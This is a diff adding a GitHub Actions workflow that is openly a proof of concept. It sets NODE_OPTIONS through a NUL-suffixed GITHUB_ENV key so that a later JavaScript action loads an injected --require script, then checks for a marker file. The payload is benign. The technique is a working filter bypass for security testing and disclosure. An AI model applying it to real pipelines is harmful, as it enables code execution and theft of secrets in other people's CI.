@@ -1,0 +1,35 @@
+name: node-options-nul-poc
+
+on:
+  push:
+    paths:
+      - .github/workflows/node-options-nul-poc.yml
+  workflow_dispatch:
+
+jobs:
+  poc:
+    runs-on: windows-latest
+    steps:
+      - name: Create NODE_OPTIONS through a NUL-suffixed GITHUB_ENV key
+        shell: pwsh
+        run: |
+          $poc = Join-Path $env:RUNNER_TEMP "poc.js"
+          $js = "require('fs').writeFileSync(process.env.GITHUB_WORKSPACE + '\\node_options_marker.txt', 'NODE_OPTIONS executed')"
+          [IO.File]::WriteAllText($poc, $js, [Text.UTF8Encoding]::new($false))
+          [IO.File]::AppendAllText($env:GITHUB_ENV, "NODE_OPTIONS`0BYPASS=--require=$poc`n", [Text.UTF8Encoding]::new($false))
+
+      - name: Trigger a JavaScript action
+        uses: actions/github-script@v7
+        with:
+          script: core.info('node action ran')
+
+      - name: Check whether NODE_OPTIONS executed
+        shell: pwsh
+        run: |
+          $marker = Join-Path $env:GITHUB_WORKSPACE "node_options_marker.txt"
+          if (Test-Path $marker) {
+            Get-Content $marker
+            exit 42
+          }
+          Write-Host "marker not present"
+          exit 0
